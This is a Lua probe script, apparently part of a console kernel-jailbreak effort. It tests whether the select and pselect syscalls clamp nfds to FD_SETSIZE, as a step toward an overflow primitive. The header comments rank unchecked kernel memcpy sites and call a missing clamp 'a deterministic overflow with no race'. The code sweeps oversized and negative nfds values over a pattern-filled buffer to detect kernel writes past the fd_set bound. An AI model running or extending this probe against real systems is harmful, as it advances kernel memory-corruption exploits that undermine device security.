-- CRASH_CLASS: MODERATE
-- PROBE 1446a: select(93) / pselect(522) fd_set length bound — does nfds get clamped to FD_SETSIZE?
--
-- Context: docs/MEMCPY_PROVENANCE.md section 6 lists 0x70322d as the highest-ranked unchecked
--   memcpy: `memcpy(arg2+0x20, arg3, arg4)` straight-line, no capacity compare, no branch, then the
--   payload length is stored into a single BYTE at +0x38 (truncated mod 256). Its level-2 callers
--   all pass a CALLRET pointer, and the shallowest syscall-reachable route is through syscalls
--   93 (select) and 522 (pselect) -- docs/sysent-names-13.60.csv rows `93,select,0x265928` and
--   `522,pselect,0x265ce0`.  A second candidate, 0x4ef6e6 `memcpy(*(arg2+0x10), src, len)`, is at
--   depth 2 from the same pair.
--
--   FreeBSD's kern_select clamps `nd > FD_SETSIZE` to FD_SETSIZE before any fd_set copy, which is
--   exactly the kind of one-line guard a platform port can lose.  If 14.10 does not clamp, then
--   `nfds` is an attacker-chosen copy length for the fd_set bitmaps -- a deterministic overflow
--   with no race, which is a far better primitive than the nanosecond aio_multi_delete window.
--
--   No probe in this tree has ever called select/pselect with an oversized nfds: the seven files
--   that call 93/522 (probes/phase23_cve_2026/502a_select_close_heavy.lua and neighbours) all pass
--   nfds = target_fd + 1 <= 6 to use select as a timing device.
--
--   Method: select WRITES BACK the fd_sets on return (the ready subset), and FreeBSD's selscan
--   copyout uses the same nd/8 length as the initial copyin.  So a 0x10000-byte buffer filled with
--   a pattern is the whole instrument: if the kernel honours nfds it touches nfds/8 bytes and no
--   more; if it clamps to FD_SETSIZE it touches exactly 128 bytes no matter how large nfds is.
--
-- -- prior art: results/INDEX.md grep "select" -> only 1358a (sys 417 selectors, unrelated),
--   177a/189a/448a/794a/949b/1166a (syscall selectors, unrelated).  probes/ grep "mk(93)|make_syscall(93)"
--   -> probes/phase11_network_attacks/50b_timer_manipulation.lua, probes/phase12_kernel_dump/51b_dynlib_cluster_fuzz.lua,
--   probes/phase15_jailbreak/67b_poll_fd_uaf.lua, probes/phase17_new_vectors/484b_localhost_nonblock.lua,
--   probes/phase17_new_vectors/484c_connect_diag.lua, probes/phase23_cve_2026/502a_select_close_heavy.lua,
--   probes/phase34_shm_race/93e2_poll_close_race.lua -- all use select as a delay, none with an
--   oversized nfds or a deliberately short fd_set.
--   docs/DEAD_ENDS.md has no select bullet; docs/MEMCPY_PROVENANCE.md:291 ranks 0x70322d C1.
--
-- Discriminator: `changed` (dwords differing from 0xA5A5A5A5 after the call) on the 0x10000 buffer.
--   changed == 32  -> 128 bytes written  -> clamped, guarded, dead end.
--   changed >  32  -> the kernel wrote more than FD_SETSIZE allows -> nfds is trusted -> live bug.

print("=== PROBE 1446a: SELECT FDSET BOUND ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local sc477 = make_syscall(477)
local sc93  = make_syscall(93)
local sc522 = make_syscall(522)
local sc20  = make_syscall(20)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sgn(rv)
    local n = to_num(rv)
    if n < 0 then return -1 end
    return n
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v)
    local ok = pcall(function() memory.write_dword(a, uint64(v)) end)
    return ok
end
local function rdq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wrq(a, v)
    local ok = pcall(function() memory.write_qword(a, uint64(v)) end)
    return ok
end

-- numeric mmap: returns a Lua NUMBER or -1 (never a userdata)
local function map(len, prot, flags, fd, off)
    local ok, va = pcall(function()
        return sc477(uint64(0), uint64(len), uint64(prot or 3),
                     uint64(flags or 0x1002), uint64(fd or 0xFFFFFFFF), uint64(off or 0))
    end)
    if not ok then return -1 end
    local n = to_num(va)
    if n < 0x10000 or n > 0x8000000000 then return -1 end
    return n
end

local pid = sgn(sc20())

-- One 0x10000 staging buffer: fd_set bitmaps live at its start, the pattern covers all of it.
local MAPLEN = 0x10000
local p = map(MAPLEN, 3)
if p < 0 then
    print("mmap failed -- aborting")
    print("=== PROBE 1446a ABORT ===")
    return
end
local READFDS = p + 0x0000
local WRITEFDS = p + 0x2000
local EXCEPTFDS = p + 0x4000
local TIMEOUT = p + 0x8000
local SIGMASK = p + 0x8100

local function fill_pat()
    local i = 0
    while i < MAPLEN do
        wr(p + i, 0xA5A5A5A5)
        i = i + 4
    end
end

-- count dwords that no longer hold the pattern, over the whole staging buffer
local function count_changed()
    local n = 0
    local i = 0
    while i < MAPLEN do
        if rd(p + i) ~= 0xA5A5A5A5 then n = n + 1 end
        i = i + 4
    end
    return n
end

-- first modified dword offset, or -1
local function first_changed()
    local i = 0
    while i < MAPLEN do
        if rd(p + i) ~= 0xA5A5A5A5 then return i end
        i = i + 4
    end
    return -1
end

-- zero timeval so select returns immediately
local function zero_timeout()
    wrq(TIMEOUT, 0)
    wrq(TIMEOUT + 8, 0)
end

print(string.format("pid=%d staging=0x%08X len=0x%X", pid, p, MAPLEN))
print("")
-- All three bitmaps are left zeroed: select still copies them in and writes the
-- (empty) ready set back out, so the byte count of that write-back is the whole
-- instrument.  No bit arithmetic is needed anywhere in this probe.
print("[0] bitmaps zeroed; only the copy length is under test")
print("")

--------------------------------------------------------------------------
-- [A] select() with nfds = 8 as the control: 8 bits = 4 bytes of bitmap
--------------------------------------------------------------------------
print("[A] select(93) control, nfds=8")
fill_pat()
zero_timeout()
local t0 = rd(TIMEOUT)
local rva = sgn(sc93(uint64(8), uint64(READFDS), uint64(0), uint64(0), uint64(TIMEOUT)))
print(string.format("  nfds=8 -> rv=%d  (%s)  changed=%d  first=0x%X",
    rva, es(), count_changed(), first_changed()))
print("")

--------------------------------------------------------------------------
-- [B] the nfds sweep.  FD_SETSIZE is 1024 -> 128 bytes.  Anything above that
--     must be clamped; if it is not, `changed` grows past 32 dwords.
--------------------------------------------------------------------------
print("[B] select(93) nfds sweep (fd_set buffer is 0x10000 bytes, pattern-filled)")
local NFD = {64, 512, 1020, 1024, 1028, 1088, 2048, 4096, 8192, 16384, 65536, 262144}
local bi = 1
while bi <= 12 do
    local n = NFD[bi]
    fill_pat()
    zero_timeout()
    local rv = sgn(sc93(uint64(n), uint64(READFDS), uint64(0), uint64(0), uint64(TIMEOUT)))
    local ch = count_changed()
    local fc = first_changed()
    local note = ""
    if rv < 0 and es():find("Bad address") then note = "  <-- EFAULT: kernel walked past our buffer" end
    if ch > 32 then note = note .. "  <-- WROTE PAST FD_SETSIZE" end
    print(string.format("  nfds=%-7d rv=%-2d (%-26s) changed=%-5d first=0x%05X%s",
        n, rv, es(), ch, fc, note))
    bi = bi + 1
end
print("")

--------------------------------------------------------------------------
-- [C] writefds / exceptfds variants at a huge nfds, in case only one of the
--     three bitmaps is unclamped
--------------------------------------------------------------------------
print("[C] bitmap role at nfds=65536")
local role = 1
while role <= 3 do
    fill_pat()
    zero_timeout()
    local rv
    if role == 1 then
        rv = sgn(sc93(uint64(65536), uint64(READFDS), uint64(WRITEFDS), uint64(EXCEPTFDS), uint64(TIMEOUT)))
    elseif role == 2 then
        rv = sgn(sc93(uint64(65536), uint64(0), uint64(WRITEFDS), uint64(0), uint64(TIMEOUT)))
    else
        rv = sgn(sc93(uint64(65536), uint64(0), uint64(0), uint64(EXCEPTFDS), uint64(TIMEOUT)))
    end
    print(string.format("  role=%d rv=%d (%s) changed=%d first=0x%X",
        role, rv, es(), count_changed(), first_changed()))
    role = role + 1
end
print("")

--------------------------------------------------------------------------
-- [D] pselect(522): six args, same bitmaps, plus a sigmask pointer
--------------------------------------------------------------------------
print("[D] pselect(522) nfds sweep")
wrq(SIGMASK, 0)
local PNFD = {8, 1024, 1028, 4096, 65536, 262144}
local pi = 1
while pi <= 6 do
    local n = PNFD[pi]
    fill_pat()
    zero_timeout()
    local rv = sgn(sc522(uint64(n), uint64(READFDS), uint64(0), uint64(0),
                         uint64(TIMEOUT), uint64(SIGMASK)))
    local ch = count_changed()
    local note = ""
    if ch > 32 then note = "  <-- WROTE PAST FD_SETSIZE" end
    print(string.format("  nfds=%-7d rv=%-2d (%-26s) changed=%-5d first=0x%05X%s",
        n, rv, es(), ch, first_changed(), note))
    pi = pi + 1
end
print("")

--------------------------------------------------------------------------
-- [E] negative nfds and a null fd_set, then the survivor check
--------------------------------------------------------------------------
print("[E] edge shapes")
fill_pat()
zero_timeout()
local rve1 = sgn(sc93(uint64(0xFFFFFFFFFFFFFFFF), uint64(READFDS), uint64(0), uint64(0), uint64(TIMEOUT)))
print(string.format("  nfds=-1  rv=%d (%s) changed=%d", rve1, es(), count_changed()))
fill_pat()
zero_timeout()
local rve2 = sgn(sc93(uint64(8), uint64(0), uint64(0), uint64(0), uint64(TIMEOUT)))
print(string.format("  null set rv=%d (%s) changed=%d", rve2, es(), count_changed()))
local rve3 = sgn(sc93(uint64(8), uint64(READFDS), uint64(0), uint64(0), uint64(0)))
print(string.format("  null timeout rv=%d (%s)", rve3, es()))
print("")

print(string.format("[F] survivor pid=%d (was %d)", sgn(sc20()), pid))
print("")
print("=== PROBE 1446a COMPLETE ===")
